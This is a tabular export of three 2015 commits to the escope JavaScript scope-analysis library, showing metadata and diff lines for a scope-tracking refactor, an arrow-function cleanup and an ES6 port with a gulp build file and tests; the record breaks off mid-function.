17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,7,9,10 Jan 2015,Add function expression name scope tests,0,1,3,91,5178,"+            this.scopeManager.__currentScope = this.currentScope().__close(this.scopeManager);<\n>+        this.__currentScope = new Scope(this<c> this.__currentScope<c> node<c> isMethodDefinition<c> Scope.SCOPE_NORMAL);<\n>+        return this.__currentScope;<\n>+        this.__currentScope = new Scope(this<c> this.__currentScope<c> node<c> false<c> Scope.SCOPE_MODULE);<\n>+        return this.__currentScope;<\n>+        this.__currentScope = new Scope(this<c> this.__currentScope<c> node<c> false<c> Scope.SCOPE_TDZ);<\n>+        return this.__currentScope;<\n>+        this.__currentScope = new Scope(this<c> this.__currentScope<c> node<c> isMethodDefinition<c> Scope.SCOPE_FUNCTION_EXPRESSION_NAME);<\n>+        return this.__currentScope;<\n>+    constructor(scopeManager<c> upperScope<c> block<c> isMethodDefinition<c> scopeType) {<\n>+            (this.type === 'global' || this.type === 'function' || this.type === 'module') ? this : upperScope.variableScope;<\n>+                upperScope = scopeManager.__nestFunctionExpressionNameScope(block<c> isMethodDefinition);<\n>+        this.upper = upperScope;<\n>+        if (this.upper) {<\n>+            this.upper.childScopes.push(this);<\n>+        return this.upper;<\n>+        if (this.functionExpressionScope) {<\n>+            return false;<\n>+        }<\n>+        if (this.block.type === Syntax.ArrowFunctionExpression) {<\n>+            return false;<\n>+        }<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+esprima = require 'esprima'<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'function name'<c> -><\n>+    it 'should create its special scope'<c> -><\n>+        ast = esprima.parse """"""<\n>+        (function name() {<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<\n>+        expect(scopeManager.scopes).to.have.length 3<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 0<\n>+        expect(globalScope.isArgumentsMaterialized()).to.be.true<\n>+        # Function expression name scope<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'name'<\n>+        expect(scope.isArgumentsMaterialized()).to.be.false<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.upper is globalScope).to.be.true<\n>+        # Function scope<\n>+        scope = scopeManager.scopes[2]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.isArgumentsMaterialized()).to.be.false<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.upper is scopeManager.scopes[1]).to.be.true<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>",-            this.currentScope().__close(this.scopeManager);<\n>-        return new Scope(this<c> node<c> isMethodDefinition<c> Scope.SCOPE_NORMAL);<\n>-        return new Scope(this<c> node<c> false<c> Scope.SCOPE_MODULE);<\n>-        return new Scope(this<c> node<c> false<c> Scope.SCOPE_TDZ);<\n>-        return new Scope(this<c> node<c> isMethodDefinition<c> Scope.SCOPE_FUNCTION_EXPRESSION_NAME);<\n>-    constructor(scopeManager<c> block<c> isMethodDefinition<c> scopeType) {<\n>-            (this.type === 'global' || this.type === 'function' || this.type === 'module') ? this : scopeManager.__currentScope.variableScope;<\n>-                scopeManager.__nestFunctionExpressionNameScope(block<c> isMethodDefinition);<\n>-        this.upper = scopeManager.__currentScope;<\n>-        if (scopeManager.__currentScope) {<\n>-            scopeManager.__currentScope.childScopes.push(this);<\n>-        scopeManager.__currentScope = this;<\n>-        scopeManager.__currentScope = this.upper;<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Fri,3,3,9 Jan 2015,Use arrow function to refer this,0,0,1,52,3392,+        enter(pattern<c> parent) {<\n>+        this.referencer.visitPattern(id<c> (pattern) => {<\n>+            this.referencer.currentScope().__define(pattern<c><\n>+                    this.declaration<c><\n>+        var letOrConstDecl;<\n>+        this.visitPattern(letOrConstDecl.declarations[0].id<c> (pattern) => {<\n>+            this.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>+        var i<c> iz;<\n>+            this.visitPattern(node.params[i]<c> (pattern) => {<\n>+                this.currentScope().__define(pattern<c><\n>+                this.visitPattern(node.left.declarations[0].id<c> (pattern) => {<\n>+                    this.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>+                this.visitPattern(node.left<c> (pattern) => {<\n>+                    if (!this.currentScope().isStrict) {<\n>+                    this.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> true);<\n>+        var decl<c> init;<\n>+        this.visitPattern(decl.id<c> (pattern<c> toplevel) => {<\n>+                this.currentScope().__referencing(pattern<c> Reference.WRITE<c> init<c> null<c> !toplevel);<\n>+                this.visitPattern(node.left<c> (pattern<c> toplevel) => {<\n>+                    if (!this.currentScope().isStrict) {<\n>+                    this.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> !toplevel);<\n>+                this.currentScope().__referencing(node.left<c> Reference.RW<c> node.right);<\n>+        this.visitPattern(node.param<c> (pattern) => {<\n>+            this.currentScope().__define(pattern<c><\n>,-        enter: function (pattern<c> parent) {<\n>-        var that = this;<\n>-        that.referencer.visitPattern(id<c> function (pattern) {<\n>-            that.referencer.currentScope().__define(pattern<c><\n>-                    that.declaration<c><\n>-        var letOrConstDecl<c> that = this;<\n>-        this.visitPattern(letOrConstDecl.declarations[0].id<c> function (pattern) {<\n>-            that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>-        var i<c> iz<c> that = this;<\n>-            this.visitPattern(node.params[i]<c> function (pattern) {<\n>-                that.currentScope().__define(pattern<c><\n>-        var that = this;<\n>-                this.visitPattern(node.left.declarations[0].id<c> function (pattern) {<\n>-                    that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>-                this.visitPattern(node.left<c> function (pattern) {<\n>-                    if (!that.currentScope().isStrict) {<\n>-                    that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> true);<\n>-        var decl<c> init<c> that = this;<\n>-        this.visitPattern(decl.id<c> function (pattern<c> toplevel) {<\n>-                that.currentScope().__referencing(pattern<c> Reference.WRITE<c> init<c> null<c> !toplevel);<\n>-        var that = this;<\n>-                this.visitPattern(node.left<c> function (pattern<c> toplevel) {<\n>-                    if (!that.currentScope().isStrict) {<\n>-                    that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> !toplevel);<\n>-                that.currentScope().__referencing(node.left<c> Reference.RW<c> node.right);<\n>-        var that = this;<\n>-        this.visitPattern(node.param<c> function (pattern) {<\n>-            that.currentScope().__define(pattern<c><\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Fri,2,51,9 Jan 2015,Update code base to ES6,2,2,10,1748,66365,"+/lib/<\n>+/powered-test/<\n>+/*<\n>+  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+  Redistribution and use in source and binary forms<c> with or without<\n>+  modification<c> are permitted provided that the following conditions are met:<\n>+    * Redistributions of source code must retain the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer.<\n>+    * Redistributions in binary form must reproduce the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer in the<\n>+      documentation and/or other materials provided with the distribution.<\n>+  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS 'AS IS'<\n>+  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+*/<\n>+'use strict';<\n>+var gulp = require('gulp')<c><\n>+    mocha = require('gulp-mocha')<c><\n>+    to5 = require('gulp-6to5')<c><\n>+    git = require('gulp-git')<c><\n>+    bump = require('gulp-bump')<c><\n>+    filter = require('gulp-filter')<c><\n>+    tagVersion = require('gulp-tag-version')<c><\n>+    sourcemaps = require('gulp-sourcemaps')<c><\n>+    coffee = require('gulp-coffee')<c><\n>+    plumber = require('gulp-plumber')<c><\n>+    source = require('vinyl-source-stream')<c><\n>+    browserify = require('browserify')<c><\n>+    lazypipe = require('lazypipe')<c><\n>+    eslint = require('gulp-eslint');<\n>+var TEST = [ 'test/*.coffee' ];<\n>+var POWERED = [ 'powered-test/*.js' ];<\n>+var SOURCE = [ 'src/**/*.js' ];<\n>+var ESLINT_OPTION = {<\n>+    rules: {<\n>+        'quotes': 0<c><\n>+        'eqeqeq': 0<c><\n>+        'no-use-before-define': 0<c><\n>+        'no-shadow': 0<c><\n>+        'no-new': 0<c><\n>+        'no-underscore-dangle': 0<c><\n>+        'no-multi-spaces': false<c><\n>+        'no-native-reassign': 0<c><\n>+        'no-loop-func': 0<c><\n>+        'no-lone-blocks': 0<\n>+    }<c><\n>+    settings: {<\n>+        ""ecmascript"": 6<c><\n>+        ""jsx"": false<\n>+    }<c><\n>+    env: {<\n>+        'node': true<\n>+    }<\n>+var build = lazypipe()<\n>+    .pipe(sourcemaps.init)<\n>+    .pipe(to5)<\n>+    .pipe(sourcemaps.write)<\n>+    .pipe(gulp.dest<c> 'lib');<\n>+gulp.task('build-for-watch'<c> function () {<\n>+    return gulp.src(SOURCE).pipe(plumber()).pipe(build());<\n>+gulp.task('build'<c> function () {<\n>+    return gulp.src(SOURCE).pipe(build());<\n>+gulp.task('browserify'<c> [ 'build' ]<c> function () {<\n>+    return browserify({<\n>+        entries: [ './lib/index.js' ]<\n>+    })<\n>+    .bundle()<\n>+    .pipe(source('bundle.js'))<\n>+    .pipe(gulp.dest('build'))<\n>+gulp.task('powered-test'<c> function () {<\n>+    return gulp.src(TEST)<\n>+        .pipe(sourcemaps.init())<\n>+        .pipe(coffee())<\n>+        .pipe(sourcemaps.write())<\n>+        .pipe(gulp.dest('./powered-test/'));<\n>+gulp.task('test'<c> [ 'build'<c> 'powered-test' ]<c> function () {<\n>+    return gulp.src(POWERED)<\n>+        .pipe(mocha({<\n>+            reporter: 'spec'<c><\n>+            timeout: 100000 // 100s<\n>+        }));<\n>+gulp.task('watch'<c> [ 'build-for-watch' ]<c> function () {<\n>+    gulp.watch(SOURCE<c> [ 'build-for-watch' ]);<\n>+// Currently<c> not works for ES6.<\n>+gulp.task('lint'<c> function () {<\n>+    return gulp.src(SOURCE)<\n>+        .pipe(eslint(ESLINT_OPTION))<\n>+        .pipe(eslint.formatEach('stylish'<c> process.stderr))<\n>+        .pipe(eslint.failOnError());<\n>+/**<\n>+ * Bumping version number and tagging the repository with it.<\n>+ * Please read http://semver.org/<\n>+ *<\n>+ * You can use the commands<\n>+ *<\n>+ *     gulp patch     # makes v0.1.0 -> v0.1.1<\n>+ *     gulp feature   # makes v0.1.1 -> v0.2.0<\n>+ *     gulp release   # makes v0.2.1 -> v1.0.0<\n>+ *<\n>+ * To bump the version numbers accordingly after you did a patch<c><\n>+ * introduced a feature or made a backwards-incompatible release.<\n>+ */<\n>+function inc(importance) {<\n>+    // get all the files to bump version in<\n>+    return gulp.src(['./package.json'])<\n>+        // bump the version number in those files<\n>+        .pipe(bump({type: importance}))<\n>+        // save it back to filesystem<\n>+        .pipe(gulp.dest('./'))<\n>+        // commit the changed version number<\n>+        .pipe(git.commit('Bumps package version'))<\n>+        // read only one file to get the version number<\n>+        .pipe(filter('package.json'))<\n>+        // **tag it in the repository**<\n>+        .pipe(tagVersion());<\n>+gulp.task('patch'<c> [ 'build' ]<c> function () { return inc('patch'); })<\n>+gulp.task('minor'<c> [ 'build' ]<c> function () { return inc('minor'); })<\n>+gulp.task('major'<c> [ 'build' ]<c> function () { return inc('major'); })<\n>+gulp.task('travis'<c> [ 'test' ]);<\n>+gulp.task('default'<c> [ 'travis' ]);<\n>+    ""estraverse"": "">=1.9.1""<\n>+    ""gulp-6to5"": ""^2.0.0""<c><\n>+    ""gulp-bump"": ""^0.1.11""<c><\n>+    ""gulp-coffee"": ""^2.2.0""<c><\n>+    ""gulp-espower"": ""^0.10.0""<c><\n>+    ""gulp-filter"": ""^2.0.0""<c><\n>+    ""gulp-git"": ""^0.5.5""<c><\n>+    ""gulp-plumber"": ""^0.6.6""<c><\n>+    ""gulp-sourcemaps"": ""^1.3.0""<c><\n>+    ""gulp-tag-version"": ""^1.2.1""<c><\n>+    ""jsdoc"": ""=3.3.0-alpha13""<c><\n>+    ""lazypipe"": ""^0.2.2""<c><\n>+    ""jsdoc"": ""jsdoc src/*.js README.md""<\n>+/**<\n>+ * @class Definition<\n>+ */<\n>+export default class Definition {<\n>+    constructor(type<c> name<c> node<c> parent<c> index<c> kind) {<\n>+ * @module escope<\n>+import assert from 'assert';<\n>+import ScopeManager from './scope-manager';<\n>+import Referencer from './referencer';<\n>+import Reference from './reference';<\n>+import Variable from './variable';<\n>+import Scope from './scope';<\n>+import { version } from '../package.json';<\n>+function defaultOptions() {<\n>+    return {<\n>+        optimistic: false<c><\n>+        directive: false<c><\n>+        sourceType: 'script'<c>  // one of ['script'<c> 'module']<\n>+        ecmaVersion: 5<\n>+    };<\n>+function updateDeeply(target<c> override) {<\n>+    var key<c> val;<\n>+    function isHashObject(target) {<\n>+        return typeof target === 'object' && target instanceof Object && !(target instanceof RegExp);<\n>+    }<\n>+    for (key in override) {<\n>+        if (override.hasOwnProperty(key)) {<\n>+            val = override[key];<\n>+            if (isHashObject(val)) {<\n>+                if (isHashObject(target[key])) {<\n>+                    updateDeeply(target[key]<c> val);<\n>+                    target[key] = updateDeeply({}<c> val);<\n>+            } else {<\n>+                target[key] = val;<\n>+    return target;<\n>+/**<\n>+ * Main interface function. Takes an Esprima syntax tree and returns the<\n>+ * analyzed scopes.<\n>+ * @function analyze<\n>+ * @param {esprima.Tree} tree<\n>+ * @param {Object} providedOptions - Options that tailor the scope analysis<\n>+ * @param {boolean} [providedOptions.optimistic=false] - the optimistic flag<\n>+ * @param {boolean} [providedOptions.directive=false]- the directive flag<\n>+ * @param {boolean} [providedOptions.ignoreEval=false]- whether to check 'eval()' calls<\n>+ * @param {string} [providedOptions.sourceType='script']- the source type of the script. one of 'script' and 'module'<\n>+ * @param {number} [providedOptions.ecmaVersion=5]- which ECMAScript version is considered<\n>+ * @return {ScopeManager}<\n>+ */<\n>+export function analyze(tree<c> providedOptions) {<\n>+    var scopeManager<c> referencer<c> options;<\n>+    options = updateDeeply(defaultOptions()<c> providedOptions);<\n>+    scopeManager = new ScopeManager(options);<\n>+    referencer = new Referencer(scopeManager);<\n>+    referencer.visit(tree);<\n>+    assert(scopeManager.__currentScope === null<c> 'currentScope should be null.');<\n>+    return scopeManager;<\n>+export {<\n>+    version<c><\n>+    Reference<c><\n>+    Variable<c><\n>+    Scope<c><\n>+    ScopeManager<\n>+const READ = 0x1;<\n>+const WRITE = 0x2;<\n>+const RW = READ | WRITE;<\n>+/**<\n>+ * A Reference represents a single occurrence of an identifier in code.<\n>+ * @class Reference<\n>+ */<\n>+export default class Reference {<\n>+    constructor(ident<c> scope<c> flag<c>  writeExpr<c> maybeImplicitGlobal<c> partial) {<\n>+    isStatic() {<\n>+    }<\n>+    isWrite() {<\n>+    }<\n>+    isRead() {<\n>+    }<\n>+    isReadOnly() {<\n>+    }<\n>+    isWriteOnly() {<\n>+    }<\n>+    isReadWrite() {<\n>+    }<\n>+/**<\n>+ * @constant Reference.READ<\n>+ * @private<\n>+ */<\n>+Reference.READ = READ;<\n>+/**<\n>+ * @constant Reference.WRITE<\n>+ * @private<\n>+ */<\n>+Reference.WRITE = WRITE;<\n>+/**<\n>+ * @constant Reference.RW<\n>+ * @private<\n>+ */<\n>+Reference.RW = RW;<\n>+/*<\n>+  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>+  Redistribution and use in source and binary forms<c> with or without<\n>+  modification<c> are permitted provided that the following conditions are met:<\n>+    * Redistributions of source code must retain the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer.<\n>+    * Redistributions in binary form must reproduce the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer in the<\n>+      documentation and/or other materials provided with the distribution.<\n>+  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+*/<\n>+import estraverse from 'estraverse';<\n>+import esrecurse from 'esrecurse';<\n>+import Reference from './reference';<\n>+import Variable from './variable';<\n>+import Definition from './definition';<\n>+import assert from 'assert';<\n>+const Syntax = estraverse.Syntax;<\n>+function traverseIdentifierInPattern(rootPattern<c> callback) {<\n>+    estraverse.traverse(rootPattern<c> {<\n>+        enter: function (pattern<c> parent) {<\n>+            var i<c> iz<c> element<c> property;<\n>+            switch (pattern.type) {<\n>+                case Syntax.Identifier:<\n>+                    // Toplevel identifier.<\n>+                    if (parent === null) {<\n>+                        callback(pattern<c> true);<\n>+                    }<\n>+                    break;<\n>+                case Syntax.SpreadElement:<\n>+                    if (pattern.argument.type === Syntax.Identifier) {<\n>+                        callback(pattern.argument<c> false);<\n>+                    }<\n>+                    break;<\n>+                case Syntax.ObjectPattern:<\n>+                    for (i = 0<c> iz = pattern.properties.length; i < iz; ++i) {<\n>+                        property = pattern.properties[i];<\n>+                        if (property.shorthand) {<\n>+                            callback(property.key<c> false);<\n>+                            continue;<\n>+                        }<\n>+                        if (property.value.type === Syntax.Identifier) {<\n>+                            callback(property.value<c> false);<\n>+                            continue;<\n>+                        }<\n>+                    }<\n>+                    break;<\n>+                case Syntax.ArrayPattern:<\n>+                    for (i = 0<c> iz = pattern.elements.length; i < iz; ++i) {<\n>+                        element = pattern.elements[i];<\n>+                        if (element && element.type === Syntax.Identifier) {<\n>+                            callback(element<c> false);<\n>+                        }<\n>+                    }<\n>+                    break;<\n>+            }<\n>+        }<\n>+    });<\n>+function isPattern(node) {<\n>+    var nodeType = node.type;<\n>+    return nodeType === Syntax.Identifier || nodeType === Syntax.ObjectPattern || nodeType === Syntax.ArrayPattern || nodeType === Syntax.SpreadElement;<\n>+// Importing ImportDeclaration.<\n>+// http://people.mozilla.org/~jorendorff/es6-draft.html#sec-moduledeclarationinstantiation<\n>+// FIXME: Now<c> we don't create module environment<c> because the context is<\n>+// implementation dependent.<\n>+class Importer extends esrecurse.Visitor {<\n>+    constructor(declaration<c> referencer) {<\n>+        super(this);<\n>+        this.declaration = declaration;<\n>+        this.referencer = referencer;<\n>+    }<\n>+    visitImport(id<c> specifier) {<\n>+        var that = this;<\n>+        that.referencer.visitPattern(id<c> function (pattern) {<\n>+            that.referencer.currentScope().__define(pattern<c><\n>+                new Definition(<\n>+                    Variable.ImportBinding<c><\n>+                    pattern<c><\n>+                    specifier<c><\n>+                    that.declaration<c><\n>+                    null<c><\n>+                    null<\n>+                    ));<\n>+        });<\n>+    }<\n>+    ImportNamespaceSpecifier(node) {<\n>+        if (node.id) {<\n>+            this.visitImport(node.id<c> node);<\n>+        }<\n>+    }<\n>+    ImportDefaultSpecifier(node) {<\n>+        this.visitImport(node.id<c> node);<\n>+    }<\n>+    ImportSpecifier(node) {<\n>+        if (node.name) {<\n>+            this.visitImport(node.name<c> node);<\n>+        } else {<\n>+            this.visitImport(node.id<c> node);<\n>+        }<\n>+    }<\n>+// Referencing variables and creating bindings.<\n>+export default class Referencer extends esrecurse.Visitor {<\n>+    constructor(scopeManager) {<\n>+        super(this<c> this);<\n>+        this.scopeManager = scopeManager;<\n>+        this.parent = null;<\n>+        this.isInnerMethodDefinition = false;<\n>+    }<\n>+    currentScope() {<\n>+        return this.scopeManager.__currentScope;<\n>+    }<\n>+    close(node) {<\n>+        while (this.currentScope() && node === this.currentScope().block) {<\n>+            this.currentScope().__close(this.scopeManager);<\n>+        }<\n>+    }<\n>+    pushInnerMethodDefinition(isInnerMethodDefinition) {<\n>+        var previous = this.isInnerMethodDefinition;<\n>+        this.isInnerMethodDefinition = isInnerMethodDefinition;<\n>+        return previous;<\n>+    }<\n>+    popInnerMethodDefinition(isInnerMethodDefinition) {<\n>+        this.isInnerMethodDefinition = isInnerMethodDefinition;<\n>+    }<\n>+    materializeTDZScope(node<c> iterationNode) {<\n>+        // http://people.mozilla.org/~jorendorff/es6-draft.html#sec-runtime-semantics-forin-div-ofexpressionevaluation-abstract-operation<\n>+        // TDZ scope hides the declaration's names.<\n>+        this.scopeManager.__nestTDZScope(node<c> iterationNode);<\n>+        this.visitVariableDeclaration(this.currentScope()<c> Variable.TDZ<c> iterationNode.left<c> 0);<\n>+    }<\n>+    materializeIterationScope(node) {<\n>+        // Generate iteration scope for upper ForIn/ForOf Statements.<\n>+        // parent node for __nestScope is only necessary to<\n>+        // distinguish MethodDefinition.<\n>+        var letOrConstDecl<c> that = this;<\n>+        this.scopeManager.__nestScope(node<c> false);<\n>+        letOrConstDecl = node.left;<\n>+        this.visitVariableDeclaration(this.currentScope()<c> Variable.Variable<c> letOrConstDecl<c> 0);<\n>+        this.visitPattern(letOrConstDecl.declarations[0].id<c> function (pattern) {<\n>+            that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>+        });<\n>+    }<\n>+    visitPattern(node<c> callback) {<\n>+        traverseIdentifierInPattern(node<c> callback);<\n>+    }<\n>+    visitFunction(node) {<\n>+        var i<c> iz<c> that = this;<\n>+        // FunctionDeclaration name is defined in upper scope<\n>+        // NOTE: Not referring variableScope. It is intended.<\n>+        // Since<\n>+        //  in ES5<c> FunctionDeclaration should be in FunctionBody.<\n>+        //  in ES6<c> FunctionDeclaration should be block scoped.<\n>+        if (node.type === Syntax.FunctionDeclaration) {<\n>+            // id is defined in upper scope<\n>+            this.currentScope().__define(node.id<c><\n>+                    new Definition(<\n>+                        Variable.FunctionName<c><\n>+                        node.id<c><\n>+                        node<c><\n>+                        null<c><\n>+                        null<c><\n>+                        null<\n>+                    ));<\n>+        }<\n>+        // Consider this function is in the MethodDefinition.<\n>+        this.scopeManager.__nestScope(node<c> this.isInnerMethodDefinition);<\n>+        for (i = 0<c> iz = node.params.length; i < iz; ++i) {<\n>+            this.visitPattern(node.params[i]<c> function (pattern) {<\n>+                that.currentScope().__define(pattern<c><\n>+                    new Definition(<\n>+                        Variable.Parameter<c><\n>+                        pattern<c><\n>+                        node<c><\n>+                        null<c><\n>+                        i<c><\n>+                        null<\n>+                    ));<\n>+            });<\n>+        }<\n>+        // Skip BlockStatement to prevent creating BlockStatement scope.<\n>+        if (node.body.type === Syntax.BlockStatement) {<\n>+            this.visitChildren(node.body);<\n>+        } else {<\n>+            this.visit(node.body);<\n>+        }<\n>+        this.close(node);<\n>+    }<\n>+    visitClass(node) {<\n>+        if (node.type === Syntax.ClassDeclaration) {<\n>+            this.currentScope().__define(node.id<c><\n>+                    new Definition(<\n>+                        Variable.ClassName<c><\n>+                        node.id<c><\n>+                        node<c><\n>+                        null<c><\n>+                        null<c><\n>+                        null<\n>+                    ));<\n>+        }<\n>+        // FIXME: Maybe consider TDZ.<\n>+        this.visit(node.superClass);<\n>+        this.scopeManager.__nestScope(node);<\n>+        if (node.id) {<\n>+            this.currentScope().__define(node.id<c><\n>+                    new Definition(<\n>+                        Variable.ClassName<c><\n>+                        node.id<c><\n>+                        node<\n>+                    ));<\n>+        }<\n>+        this.visit(node.body);<\n>+        this.close(node);<\n>+    }<\n>+    visitProperty(node) {<\n>+        var previous<c> isMethodDefinition;<\n>+        if (node.computed) {<\n>+            this.visit(node.key);<\n>+        }<\n>+        isMethodDefinition = node.type === Syntax.MethodDefinition || node.method;<\n>+        if (isMethodDefinition) {<\n>+            previous = this.pushInnerMethodDefinition(true);<\n>+        }<\n>+        this.visit(node.value);<\n>+        if (isMethodDefinition) {<\n>+            this.popInnerMethodDefinition(previous);<\n>+        }<\n>+    }<\n>+    visitForIn(node) {<\n>+        var that = this;<\n>+        if (node.left.type === Syntax.VariableDeclaration && node.left.kind !== 'var') {<\n>+            this.materializeTDZScope(node.right<c> node);<\n>+            this.visit(node.right);<\n>+            this.close(node.right);<\n>+            this.materializeIterationScope(node);<\n>+            this.visit(node.body);<\n>+            this.close(node);<\n>+        } else {<\n>+            if (node.left.type === Syntax.VariableDeclaration) {<\n>+                this.visit(node.left);<\n>+                this.visitPattern(node.left.declarations[0].id<c> function (pattern) {<\n>+                    that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>+                });<\n>+            } else {<\n>+                if (!isPattern(node.left)) {<\n>+                    this.visit(node.left);<\n>+                }<\n>+                this.visitPattern(node.left<c> function (pattern) {<\n>+                    var maybeImplicitGlobal = null;<\n>+                    if (!that.currentScope().isStrict) {<\n>+                        maybeImplicitGlobal = {<\n>+                            pattern: pattern<c><\n>+                            node: node<\n>+                        };<\n>+                    }<\n>+                    that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> true);<\n>+                });<\n>+            }<\n>+            this.visit(node.right);<\n>+            this.visit(node.body);<\n>+        }<\n>+    }<\n>+    visitVariableDeclaration(variableTargetScope<c> type<c> node<c> index) {<\n>+        var decl<c> init<c> that = this;<\n>+        decl = node.declarations[index];<\n>+        init = decl.init;<\n>+        // FIXME: Don't consider initializer with complex patterns.<\n>+        // Such as<c><\n>+        // var [a<c> b<c> c = 20] = array;<\n>+        this.visitPattern(decl.id<c> function (pattern<c> toplevel) {<\n>+            variableTargetScope.__define(pattern<c><\n>+                new Definition(<\n>+                    type<c><\n>+                    pattern<c><\n>+                    decl<c><\n>+                    node<c><\n>+                    index<c><\n>+                    node.kind<\n>+                ));<\n>+            if (init) {<\n>+                that.currentScope().__referencing(pattern<c> Reference.WRITE<c> init<c> null<c> !toplevel);<\n>+            }<\n>+        });<\n>+    }<\n>+    AssignmentExpression(node) {<\n>+        var that = this;<\n>+        if (isPattern(node.left)) 